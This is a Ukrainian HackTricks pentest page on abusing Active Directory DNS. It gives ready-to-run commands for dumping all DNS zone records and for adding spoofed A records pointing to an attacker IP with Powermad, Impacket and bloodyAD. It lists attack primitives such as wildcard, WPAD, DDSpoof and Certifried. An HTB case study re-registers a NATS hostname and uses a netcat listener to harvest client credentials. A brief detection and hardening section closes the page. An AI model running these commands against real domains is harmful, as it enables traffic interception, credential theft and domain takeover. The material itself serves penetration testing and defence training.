# Записи DNS AD

{{#include ../../banners/hacktricks-training.md}}

За замовчуванням **будь-який користувач** в Active Directory може **перерахувати всі записи DNS** у DNS-зонах домену або лісу, подібно до передачі зони (користувачі можуть переглядати дочірні об'єкти DNS-зони в середовищі AD).

Інструмент [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) дає змогу **перераховувати** та **експортувати** **всі записи DNS** у зоні для цілей recon внутрішніх мереж.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (квітень 2025) додає вивід у форматі JSON/Greppable (`--json`), багатопотокове DNS-розпізнавання та підтримку TLS 1.2/1.3 під час підключення до LDAPS

Для отримання додаткової інформації прочитайте [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Створення / модифікація записів (ADIDNS spoofing)

Оскільки група **Authenticated Users** за замовчуванням має дозвіл **Create Child** у DACL зони, будь-який обліковий запис домену (або обліковий запис комп’ютера) може зареєструвати додаткові записи. Це можна використати для перехоплення трафіку, примусу до NTLM relay або навіть повної компрометації домену.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py входить до складу Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Поширені примітиви атак

1. **Wildcard record** – `*.<zone>` перетворює AD DNS server на responder корпоративного масштабу, подібний до LLMNR/NBNS spoofing. Це можна використати для захоплення NTLM hashes або їх relay до LDAP/SMB.  (Потрібно, щоб WINS-lookup був вимкнений.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – додайте `wpad` (або **NS** record, що вказує на host атакуючого, щоб обійти Global-Query-Block-List) і прозоро проксуюйте вихідні HTTP-запити для збору credentials. Microsoft виправила wildcard/ DNAME bypasses (CVE-2018-8320), але **NS-records все ще працюють**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – захопіть IP-адресу, яка раніше належала workstation, і пов’язаний DNS entry усе ще резолвитиметься, що дає змогу виконувати resource-based constrained delegation або Shadow-Credentials attacks, взагалі не взаємодіючи з DNS.
4. **DHCP → DNS spoofing** – у типовому Windows DHCP+DNS deployment unauthenticated attacker у тій самій subnet може перезаписати будь-який наявний A record (зокрема Domain Controllers), надсилаючи підроблені DHCP-запити, які ініціюють dynamic DNS updates (Akamai “DDSpoof”, 2023). Це забезпечує machine-in-the-middle над Kerberos/LDAP і може призвести до повного захоплення domain.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – змініть `dNSHostName` machine account, який ви контролюєте, зареєструйте відповідний A record, а потім запросіть certificate для цього імені, щоб impersonate DC. Такі tools, як **Certipy** або **BloodyAD**, повністю автоматизують цей процес.

---

### Hijacking internal services через stale dynamic records (NATS case study)

Коли dynamic updates відкриті для всіх authenticated users, **скасоване ім’я service можна повторно зареєструвати й спрямувати на attacker infrastructure**. Mirage HTB DC розкрив hostname `nats-svc.mirage.htb` після DNS scavenging, тому будь-який low-privileged user міг:<sup>[[3]](#references)</sup>

1. **Підтвердити, що record відсутній**, і дізнатися SOA за допомогою `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Повторно створити запис** у напрямку зовнішнього/VPN-інтерфейсу, який вони контролюють:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Імітуйте plaintext service**. Клієнти NATS очікують побачити один банер `INFO { ... }` перед надсиланням облікових даних, тому для збору секретів достатньо скопіювати легітимний банер зі справжнього broker:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Будь-який клієнт, який розпізнає перехоплене ім’я, негайно виконає leak свого JSON-фрейму `CONNECT` (включно з `"user"`/`"pass"`) на listener. Запуск офіційного бінарного файлу `nats-server -V` на хості attacker, вимкнення редагування log або просте sniffing сесії за допомогою Wireshark дають ті самі облікові дані у відкритому вигляді, оскільки TLS був необов’язковим.

4. **Pivot із перехопленими обліковими даними** – у Mirage викрадений NATS-акаунт надавав доступ до JetStream, що розкрив історичні події автентифікації, які містили повторно використовувані AD-імена користувачів і паролі.

Цей шаблон застосовується до кожного інтегрованого з AD сервісу, який покладається на незахищені TCP-handshake (HTTP API, RPC, MQTT тощо): щойно DNS-запис перехоплено, attacker стає сервісом.

---

## Виявлення та посилення захисту

* Забороніть **Authenticated Users** право *Create all child objects* у чутливих зонах і делегуйте динамічні оновлення спеціальному акаунту, який використовується DHCP.
* Якщо потрібні динамічні оновлення, встановіть для зони режим **Secure-only** і ввімкніть **Name Protection** у DHCP, щоб лише комп’ютерний об’єкт-власник міг перезаписувати власний запис.
* Відстежуйте події DNS Server з ID 257/252 (динамічне оновлення), 770 (передавання зони), а також LDAP-записи до `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Блокуйте небезпечні імена (`wpad`, `isatap`, `*`) за допомогою навмисно безпечного запису або через Global Query Block List.
* Підтримуйте DNS-сервери оновленими – наприклад, RCE-уразливості CVE-2024-26224 і CVE-2024-26231 отримали оцінку **CVSS 9.8** та можуть віддалено експлуатуватися проти Domain Controllers.

## Посилання

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, досі є de-facto reference для атак із wildcard/WPAD)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
